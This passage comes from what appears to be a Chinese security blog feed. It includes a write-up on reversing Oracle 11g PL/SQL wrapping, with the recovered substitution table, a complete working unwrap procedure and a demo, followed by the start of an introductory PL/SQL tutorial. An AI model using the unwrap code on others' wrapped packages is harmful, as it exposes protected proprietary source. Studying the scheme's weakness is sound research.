class="line">DBMS_OUTPUT.PUT_LINE(&#x27;wrong orginal char:&#x27;||vchar||&#x27; hex base64:&#x27;||abc.xr);</span><br><span class="line">End If;</span><br><span class="line">End If;</span><br><span class="line">End Loop;</span><br><span class="line">End Loop;</span><br><span class="line">End Loop;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>​        等待运行一段时间</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/9.png"></p><p>​        筛选出sys.idltranslate表前10条数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sys.idltranslate where rownum&lt;=10;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/10.png"></p><p>​        运行上面这段SQL大概会产生200多条记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) c_base64decode from sys.idltranslate;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/11.png"></p><p>​        还未达到00-FF总共256条记录，建议替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;procedure &#x27;||vChar txt from dual</span><br></pre></td></tr></table></figure><p>​        中的procedure关健字为package或者function类似的，继续运行直到替换表中有不重复的256条记录为止。有了替换表的内容，就可以unwrap出明文。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/12.png"></p><p>替换表的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3D6585B318DBE287F152AB634BB5A05F7D687B9B24C228678ADEA4261E03EB176F343E7A3FD2A96A0FE935561FB14D1078D975F6BC4104816106F9ADD6D5297E869E79E505BA84CC6E278EB05DA8F39FD0A271B858DD2C38994C480755E4538C46B62DA5AF322240DC50C3A1258B9C16605CCFFD0C981CD4376D3C3A30E86C3147F533DA43C8E35E1994ECE6A39514E09D64FA5915C52FCABB0BDFF297BF0A76B449445A1DF0009621807F1A82394FC1A7D70DD1D8FF139370EE5BEFBE09B97772E7B254B72AC7739066200E51EDF87C8F2EF412C62B83CDACCB3BC44EC069366202AE88FCAA4208A64557D39ABDE1238D924A1189746B91FBFEC901EA1BF7CE</span><br></pre></td></tr></table></figure><h4 id="3-2-4-编写Unwrap-PL-SQL程序"><a href="#3-2-4-编写Unwrap-PL-SQL程序" class="headerlink" title="3.2.4 编写Unwrap PL/SQL程序"></a>3.2.4 编写Unwrap PL/SQL程序</h4><p>​        写unwrap.sql程序，思路反向操作，得到密文的替换串，截取20字节后的替换串，然后查表得到LZ压缩串，再通过LZ_java包解压得到明文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on;</span><br><span class="line">create directory FILEPATH as &#x27;D:\sql_files&#x27;;  --创建一个路径FILEPATH</span><br><span class="line">grant read,write on directory FILEPATH to sys; --给用户sys授予路径读写的权限</span><br><span class="line">create or replace procedure unwrap(o in varchar,n in varchar, t in varchar)</span><br><span class="line">as</span><br><span class="line">vWrappedtext Varchar2(32767);               </span><br><span class="line">vtrimtext Varchar2(32767);          </span><br><span class="line">vChar Varchar2(2);</span><br><span class="line">vRepchar Varchar2(2);</span><br><span class="line">vLZinflatestr Varchar2(32767);</span><br><span class="line">nLen Integer;</span><br><span class="line">nLoop Integer;</span><br><span class="line">nCnt Integer;</span><br><span class="line">l_file utl_file.file_type;</span><br><span class="line"></span><br><span class="line">type vartab is table of varchar2(2) index by varchar2(2);</span><br><span class="line">mytbl vartab;</span><br><span class="line">cursor getchar is select C_BASE64DECODE xr,C_LZDEFLATECODE dr from sys.idltranslate;</span><br><span class="line">Begin</span><br><span class="line">for i in getchar loop --sys.idltranslate表内容存到字符数组</span><br><span class="line">   mytbl(i.xr):=i.dr;</span><br><span class="line">end loop;</span><br><span class="line">vtrimtext:=&#x27;&#x27;;</span><br><span class="line">select count(*) into nCnt from DBA_SOURCE</span><br><span class="line">Where owner=o</span><br><span class="line">And Name = n</span><br><span class="line">And Type = t ;</span><br><span class="line">if nCnt &gt;0 and nCnt &lt;5 then</span><br><span class="line">for i in 1..nCnt loop</span><br><span class="line">if i=1 then</span><br><span class="line">select rtrim( substr( TEXT, instr( TEXT, chr( 10 ), 1, 20 ) + 1 ), chr(10) )   --保存去掉换行的BASE64码正文</span><br><span class="line">into vLZinflatestr</span><br><span class="line">from DBA_SOURCE</span><br><span class="line">Where owner = o</span><br><span class="line">And Name = n</span><br><span class="line">And Type = t and line=i;</span><br><span class="line">else</span><br><span class="line">select text into vLZinflatestr</span><br><span class="line">from DBA_SOURCE</span><br><span class="line">Where owner = o</span><br><span class="line">And Name = n</span><br><span class="line">And Type=t and line=i;</span><br><span class="line">end if;</span><br><span class="line">vtrimtext:=vtrimtext||vLZinflatestr;</span><br><span class="line">end loop;</span><br><span class="line">end if;</span><br><span class="line">vtrimtext:=replace(vtrimtext,chr(10),&#x27;&#x27;);</span><br><span class="line">nLen := Length(vtrimtext)/64 ;</span><br><span class="line">vWrappedtext :=&#x27;&#x27;;</span><br><span class="line">for i in 0..nLen  loop  </span><br><span class="line">if i&lt; nLen then</span><br><span class="line">vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1 , 64 ))) ;</span><br><span class="line">else</span><br><span class="line">vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1  ))) ;</span><br><span class="line">end if;</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vWrappedtext);</span><br><span class="line">End Loop;</span><br><span class="line">--vWrappedtext:=substr(vWrappedtext,41);</span><br><span class="line">nLen := Length(vWrappedtext)/2 - 1;</span><br><span class="line">vLZinflatestr :=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">For nLoop In 20..nLen Loop --从第21字节开始</span><br><span class="line">vChar := Substrb(vWrappedtext,nLoop*2+1,2);</span><br><span class="line">/*</span><br><span class="line">Select Count(*) Into nCnt From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar;</span><br><span class="line">If nCnt &lt;&gt; 1 Then</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(&#x27;SUBSTATION TABLE WARNING: Count not find following char--&#x27;||vChar);</span><br><span class="line">Return;</span><br><span class="line">Else</span><br><span class="line">Select C_LZDEFLATECODE Into vRepchar From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar;</span><br><span class="line">End If;</span><br><span class="line">*/</span><br><span class="line">vLZinflatestr := vLZinflatestr || mytbl(vChar); --从字符数组匹配</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vLZinflatestr);</span><br><span class="line">End Loop;</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vLZinflatestr);</span><br><span class="line">l_file := utl_file.fopen(&#x27;FILEPATH&#x27;, &#x27;unwrap_text.sql&#x27;, &#x27;W&#x27;); --给文件变量赋予一个初值unwrap_text.sql，最后一个参数W表示写入</span><br><span class="line">utl_file.put_line(l_file, amosunwrapper.inflate(vLZinflatestr));</span><br><span class="line">utl_file.fclose(l_file);--关闭文件</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(amosunwrapper.inflate(vLZinflatestr));</span><br><span class="line">End;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><h2 id="4-Wrap和Unwrap过程"><a href="#4-Wrap和Unwrap过程" class="headerlink" title="4. Wrap和Unwrap过程"></a>4. Wrap和Unwrap过程</h2><p>1.先编一个需要wrap的sql文件，test.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">create or replace function test_f(hy in varchar)</span><br><span class="line">return varchar</span><br><span class="line">as</span><br><span class="line">x varchar(2);</span><br><span class="line">begin</span><br><span class="line">select</span><br><span class="line">case</span><br><span class="line">when hy &gt;=&#x27;01&#x27; and hy&lt;= &#x27;05&#x27; then 1</span><br><span class="line">when hy &gt;=&#x27;06&#x27; and hy&lt;= &#x27;11&#x27; then 2</span><br><span class="line">when hy &gt;=&#x27;13&#x27; and hy&lt;= &#x27;43&#x27; then 3</span><br><span class="line">when hy &gt;=&#x27;44&#x27; and hy&lt;= &#x27;46&#x27; then 4</span><br><span class="line">when hy &gt;=&#x27;47&#x27; and hy&lt;= &#x27;50&#x27; then 5</span><br><span class="line">when hy &gt;=&#x27;51&#x27; and hy&lt;= &#x27;59&#x27; then 6</span><br><span class="line">when hy &gt;=&#x27;60&#x27; and hy&lt;= &#x27;62&#x27; then 7</span><br><span class="line">when hy  =&#x27;63&#x27; or  hy = &#x27;65&#x27; then 8</span><br><span class="line">when hy &gt;=&#x27;66&#x27; and hy&lt;= &#x27;67&#x27; then 9</span><br><span class="line">when hy &gt;=&#x27;68&#x27; and hy&lt;= &#x27;71&#x27; then 10</span><br><span class="line">when hy &gt;=&#x27;72&#x27; and hy&lt;= &#x27;72&#x27; then 11</span><br><span class="line">when hy &gt;=&#x27;73&#x27; and hy&lt;= &#x27;74&#x27; then 12</span><br><span class="line">when hy &gt;=&#x27;75&#x27; and hy&lt;= &#x27;78&#x27; then 13</span><br><span class="line">when hy &gt;=&#x27;79&#x27; and hy&lt;= &#x27;81&#x27; then 14</span><br><span class="line">when hy &gt;=&#x27;82&#x27; and hy&lt;= &#x27;83&#x27; then 15</span><br><span class="line">when hy &gt;=&#x27;84&#x27; and hy&lt;= &#x27;84&#x27; then 16</span><br><span class="line">when hy &gt;=&#x27;85&#x27; and hy&lt;= &#x27;87&#x27; then 17</span><br><span class="line">when hy &gt;=&#x27;88&#x27; and hy&lt;= &#x27;92&#x27; then 18</span><br><span class="line">when hy &gt;=&#x27;93&#x27; and hy&lt;= &#x27;98&#x27; then 19</span><br><span class="line">else null</span><br><span class="line">end</span><br><span class="line">into x from dual;</span><br><span class="line">return x;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>2.用wrap工具加密test.sql文件，在cmd里运行wrap工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Tahir&gt; wrap iname=C:\Users\Tahir\Desktop\instantclient_12_1\test.sql oname=C:\Users\Tahir\Desktop\instantclient_12_1\test.plb</span><br><span class="line"></span><br><span class="line">wrap iname=C:\Users\Tahir\Desktop\instantclient_12_1\test2.sql oname=C:\Users\Tahir\Desktop\instantclient_12_1\test2.plb</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/15.png"></p><p>3.用plb文件创建函数</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/13.png"></p><p>4.测试函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.test_f(&#x27;45&#x27;) from dual;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/14.png"></p><p> 5.加密后的内容</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/16.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/17.png"></p><p>6.利用unwrap.sql进行解密</p><p>首先执行@unwrap.sql，生成unwrap储存过程</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/18.png"></p><p>调用unwrap存储过程，对test_f进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sys.unwrap(&#x27;SYS&#x27;,&#x27;TEST_F&#x27;,&#x27;FUNCTION&#x27;);</span><br></pre></td></tr></table></figure><p>测试的时候，发现解压LZ会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.zip.ZipException: oversubscribed dynamic bit lengths tree</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/19.png"></p><p>java jdk版本过低，更换版本后解决，执行成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/21.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;​        Oracle为PL/SQL开发者提供的一种对他们所写的代码（oracle下的对象Package、Procedure、Function、Java Source等）进行加密的工具。当PL/SQL代码被加密以后，它就被描述为被“包装过”</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database PL/SQL注入漏洞原理</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/</id>
    <published>2021-07-03T03:05:40.000Z</published>
    <updated>2021-07-03T03:11:31.227Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>by Tahir</p><h2 id="1-PL-SQL概述"><a href="#1-PL-SQL概述" class="headerlink" title="1.PL/SQL概述"></a>1.PL/SQL概述</h2><p>PL/SQL是一种ORACLE数据库服务器的编程语言</p><p>继承了ADA（ 阿达·洛芙莱斯）第4代语言的特点</p><p>PL/SQL是一个可移植、高效的事务处理语言：</p><ol><li>支持SQL</li><li>支持面向对象编程</li><li>良好的性能</li><li>效率高</li><li>可移植</li><li>与Oracle集成</li><li>高度安全</li></ol><p>PL/SQL的编码和运行时系统是一项技术，而不是一个独立的产品。可以把这项技术想象成一个能够编译并运行PL/SQL块和子程序的引擎。这个引擎可以安装在Oracle服务器上或安装在Oracle Forms，Oracle Reports这样的开发工具中。所以，PL/SQL可以在两种环境中存在：</p><ol><li>Oracle数据库服务器</li><li>Oracle开发工具</li></ol><p>这两种环境是独立的。PL/SQL虽被绑定到Oracle服务器上，但在某些工具中是无法使用的。在这两种环境下，PL/SQL引擎都能接受有效的PL/SQL块或子程序。下图是PL/SQL引擎处理匿名块的过程，引擎会处理过程化语句，而把SQL语句发送给Oracle服务器端的SQL语句执行程序(SQL Statement Executor)来处理。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E5%BC%95%E6%93%8E.gif"></p><h3 id="1-1-PL-SQL-块结构"><a href="#1-1-PL-SQL-块结构" class="headerlink" title="1.1 PL/SQL 块结构"></a>1.1 PL/SQL 块结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DECLARE]</span><br><span class="line">declaration_statements</span><br><span class="line">BEGIN</span><br><span class="line">executable_statements</span><br><span class="line"></span><br><span class="line">[EXCEPTION]</span><br><span class="line">exception_handing_statements</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h3 id="1-2-PL-SQL-变量和类型"><a href="#1-2-PL-SQL-变量和类型" class="headerlink" title="1.2 PL/SQL 变量和类型"></a>1.2 PL/SQL 变量和类型</h3><h4 id="1-2-1-变量声明"><a href="#1-2-1-变量声明" class="headerlink" title="1.2.1 变量声明"></a>1.2.1 变量声明</h4><p>语法：variable_name [CONSTANT] type [NOT NULL] [:=value];</p><p>　　variable_name: 用于定义变量名，变量名的命名要符合标识符命名规范。</p><p>　　type: 变量需要使用的数据类型，可以使用所有SQL类型或PL/SQL类型。用方括号 [] 括起来的是可选部分。</p><p>　　CONSTANT: 表示声明为一个常量，常量在定义时需要指定初始值，一旦定义其值，不能再被改变。</p><p>　　NOT NULL: 用于约束变量的值不能为空。</p><p>　　:=value: 用于为变量赋初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_empname VARCHAR2(20);     --定义员工名称变量</span><br><span class="line">　　v_deptname VARCHAR2(20);    --定义部门名称变量</span><br><span class="line">　　v_hiredate DATE NOT NULL := SYSDATE;  --定义入职日期变量</span><br><span class="line">　　v_empno INT NOT NULL DEFAULT 1111;  --变量员工编码变量</span><br><span class="line">BEGIN</span><br><span class="line">　　NULL;   --不执行任何代码</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>​        注：   :=和DEFAULT是可以互换使用的，都用来为变量赋初始值。一旦出现了NOT NULL关键字，后面必须具有赋初始值的语句。</p><table><thead><tr><th>类型</th><th>子类</th><th>说   明</th><th>范  围</th><th>ORACLE限制</th></tr></thead><tbody><tr><td>CHAR</td><td>CharacterStringRowidNchar</td><td>定长字符串 民族语言字符集</td><td>0à32767可选,确省=1</td><td>2000</td></tr><tr><td>VARCHAR2</td><td>Varchar, StringNVARCHAR2</td><td>可变字符串民族语言字符集</td><td>0à327674000</td><td>4000</td></tr><tr><td>BINARY_INTEGER</td><td></td><td>带符号整数,为整数计算优化性能</td><td></td><td></td></tr><tr><td>NUMBER(p,s)</td><td>Dec Double precisionIntegerIntNumericRealSmall int</td><td>小数, NUMBER 的子类型高精度实数整数, NUMBER 的子类型整数, NUMBER 的子类型与NUMBER等价与NUMBER等价整数, 比 integer 小</td><td></td><td></td></tr><tr><td>LONG</td><td></td><td>变长字符串</td><td>0-&gt;2147483647</td><td>32,767字节</td></tr><tr><td>DATE</td><td></td><td>日期型</td><td>公元前4712年1月1日至公元后4712年12月31日</td><td></td></tr><tr><td>BOOLEAN</td><td></td><td>布尔型</td><td>TRUE, FALSE,NULL</td><td>不使用</td></tr><tr><td>ROWID</td><td></td><td>存放数据库行号</td><td></td><td></td></tr><tr><td>UROWID</td><td></td><td>通用行标识符，字符类型</td><td></td><td></td></tr></tbody></table><p>　如果变量在声明时没有指定初始值，默认情况下，变量被初始化为NULL值。如果未给变量赋值，就直接使用变量，将会产生意想不到的结果。</p><p>　　根据变量的不同类型，可以为变量直接赋常量值，也可以使用表达式来计算变量的值。</p><p>　　下面的代码根据薪资和加薪比例来计算员工的结果薪资值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_salary NUMBER(7,2);</span><br><span class="line">　　v_rate NUMBER(7,2) :=0.12;</span><br><span class="line">　　v_base_salary NUMBER(7,2) :=1200;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line"> 　v_salary := v_base_salary*(1+v_rate); --使用表达式为变量赋值</span><br><span class="line">　　DBMS_OUTPUT.put_line(&#x27;员工的薪资值为：&#x27;||v_salary);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>在为PL/SQL变量赋值时，需要注意变量的类型。下面列出了常用的变量类型的赋值方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_string VARCHAR2(200);</span><br><span class="line">　　v_hire_date DATE;</span><br><span class="line">　　v_bool BOOLEAN;  --PL/SQL布尔类型</span><br><span class="line">BEGIN</span><br><span class="line">　　v_bool:=True;  --为布尔类型赋值</span><br><span class="line">　　v_hire_date:=to_date(&#x27;2019-04-28&#x27;,&#x27;yyyy-mm-dd&#x27;); --使用函数为日期赋值</span><br><span class="line">　　v_hire_date:=SYSDATE;  --使用日期函数赋值</span><br><span class="line">　　v_hire_date:=date&#x27;2019-04-28&#x27;;  --直接赋静态日期值</span><br><span class="line">　　v_string:=&#x27;this is a string&#x27;;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><h4 id="1-2-2-游标"><a href="#1-2-2-游标" class="headerlink" title="1.2.2 游标"></a>1.2.2 游标</h4><p>Oracle使用工作区(work area)来执行SQL语句，并保存处理信息。PL/SQL可以让我们使用游标来为工作区命名，并访问存储的信息。游标的类型有两种：隐式和显式。PL/SQL会为所有的SQL数据操作声明一个隐式的游标，包括只返回一条记录的查询操作。对于返回多条记录的查询，我们可以显式地声明一个游标来处理每一条记录。如下例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT empno, ename, job</span><br><span class="line">   FROM emp</span><br><span class="line">   WHERE deptno = 20;</span><br></pre></td></tr></table></figure><p>由多行查询返回的行集合称为结果集(result set)。它的大小就是满足我们查询条件的行的个数。如下图所示，显式游标”指向”当前行的记录，这可以让我们的程序每次处理一条记录。</p><p>多行查询处理有些像文件处理。例如，一个COBOL程序打开一个文件，处理记录，然后关闭文件。同样，一个PL/SQL程序打开一个游标，处理查询出来的行，然后关闭游标。就像文件指针能标记打开文件中的当前位置一样，游标能标记出结构集的当前位置。</p><p>我们可以使用OPEN，FETCH和CLOSE语句来控制游标，OPEN用于打开游标并使游标指向结果集的第一行，FETCH会检索当前行的信息并把游标指移向下一行，当最后一行也被处理完后，CLOSE就会关闭游标。</p><h4 id="1-2-3-游标FOR循环"><a href="#1-2-3-游标FOR循环" class="headerlink" title="1.2.3 游标FOR循环"></a>1.2.3 游标FOR循环</h4><p>在大多需要使用显式游标的情况下，我们都可以用一个简单的游标FOR循环来代替OPEN，FETCH和CLOSE语句。首先，游标FOR循环会隐式地声明一个代表当前行的循环索引(loop index)变量。下一步，它会打开游标，反复从结果集中取得数据并放到循环索引的各个域(field)中。当所有行都被处理过以后，它就会关闭游标。下面的例子中，游标FOR循环隐式地声明了一个emp_rec记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT ename, sal, hiredate, deptno</span><br><span class="line">   FROM emp;</span><br><span class="line"> ...</span><br><span class="line">BEGIN</span><br><span class="line"> FOR emp_rec IN c1 LOOP</span><br><span class="line">  ...</span><br><span class="line">  salary_total  := salary_total + emp_rec.sal;</span><br><span class="line"> END LOOP;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>为了使用每一个查询到的行中的每一个字段，我们可以使用点标志(dot notation)，它的作用就像一个域选择器。</p><h4 id="1-2-4-游标变量"><a href="#1-2-4-游标变量" class="headerlink" title="1.2.4 游标变量"></a>1.2.4 游标变量</h4><p>游标变量的使用方式和游标类似，但更加灵活，因为它不绑定于某个特定的查询，所以可用于打开任何返回类型相兼容的查询语句。游标变量是真正的PL/SQL变量，我们可以为它赋值，把它传递给子程序。如下例，我们把游标变量作为存储过程open_cv的一个参数传进去，程序执行时，可以根据choice值的不同，灵活地打开不同的查询内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE open_cv(generic_cv IN OUT genericcurtyp, choice NUMBER) IS</span><br><span class="line">BEGIN</span><br><span class="line"> IF choice = 1 THEN</span><br><span class="line">  OPEN 